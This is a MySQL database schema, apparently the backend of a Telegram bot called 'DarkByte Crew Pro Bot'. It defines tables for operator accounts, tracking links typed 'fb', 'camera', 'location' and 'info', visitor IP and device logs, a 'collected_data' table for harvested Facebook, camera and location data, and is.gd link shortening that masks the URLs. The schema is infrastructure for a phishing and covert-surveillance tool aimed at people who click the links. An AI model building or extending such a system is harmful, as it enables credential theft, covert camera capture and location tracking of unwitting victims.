
-- Database: if0_41322982_darkbytecre
CREATE DATABASE IF NOT EXISTS if0_41322982_darkbytecre;
USE if0_41322982_darkbytecre;

-- Users Table
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT UNIQUE NOT NULL,
    username VARCHAR(255),
    first_name VARCHAR(255),
    last_name VARCHAR(255),
    is_approved BOOLEAN DEFAULT FALSE,
    is_banned BOOLEAN DEFAULT FALSE,
    is_admin BOOLEAN DEFAULT FALSE,
    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP NULL,
    total_links INT DEFAULT 0,
    total_visits INT DEFAULT 0,
    total_data INT DEFAULT 0,
    warning_count INT DEFAULT 0,
    INDEX idx_user_id (user_id),
    INDEX idx_status (is_approved, is_banned)
);

-- Links Table
CREATE TABLE links (
    id INT AUTO_INCREMENT PRIMARY KEY,
    link_id VARCHAR(100) UNIQUE NOT NULL,
    user_id BIGINT NOT NULL,
    link_type ENUM('fb', 'camera', 'location', 'info', 'all', 'custom') NOT NULL,
    target_url TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NULL,
    total_visits INT DEFAULT 0,
    total_data INT DEFAULT 0,
    is_active BOOLEAN DEFAULT TRUE,
    FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE,
    INDEX idx_link_id (link_id),
    INDEX idx_user (user_id),
    INDEX idx_type (link_type)
);

-- Visitors Table
CREATE TABLE visitors (
    id INT AUTO_INCREMENT PRIMARY KEY,
    link_id VARCHAR(100) NOT NULL,
    ip_address VARCHAR(45),
    country VARCHAR(100),
    city VARCHAR(100),
    device VARCHAR(255),
    browser VARCHAR(255),
    os VARCHAR(255),
    visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (link_id) REFERENCES links(link_id) ON DELETE CASCADE,
    INDEX idx_link (link_id)
);

-- Collected Data Table
CREATE TABLE collected_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    link_id VARCHAR(100) NOT NULL,
    data_type ENUM('facebook', 'camera', 'location', 'info') NOT NULL,
    data_content JSON NOT NULL,
    collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    FOREIGN KEY (link_id) REFERENCES links(link_id) ON DELETE CASCADE,
    INDEX idx_link_data (link_id, data_type)
);

-- Shortened Links Table
CREATE TABLE shortened_links (
    id INT AUTO_INCREMENT PRIMARY KEY,
    short_code VARCHAR(50) UNIQUE NOT NULL,
    original_url TEXT NOT NULL,
    user_id BIGINT NOT NULL,
    site_code VARCHAR(10),
    isgd_url VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    total_clicks INT DEFAULT 0,
    FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE,
    INDEX idx_short_code (short_code),
    INDEX idx_user_links (user_id)
);

-- Activity Logs Table
CREATE TABLE activity_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT,
    action VARCHAR(255) NOT NULL,
    details JSON,
    ip_address VARCHAR(45),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_user_action (user_id, action),
    INDEX idx_created (created_at)
);

-- System Settings Table
CREATE TABLE settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    setting_key VARCHAR(100) UNIQUE NOT NULL,
    setting_value TEXT,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Insert default admin (you can change ID later)
INSERT INTO users (user_id, username, first_name, is_approved, is_admin) 
VALUES (123456789, 'DarkByteCrew', 'Admin', TRUE, TRUE);

-- Insert default settings
INSERT INTO settings (setting_key, setting_value) VALUES
('bot_name', 'DarkByte Crew Pro Bot'),
('welcome_message', 'Welcome to DarkByte Crew Pro'),
('rate_limit', '5'),
('maintenance_mode', 'false');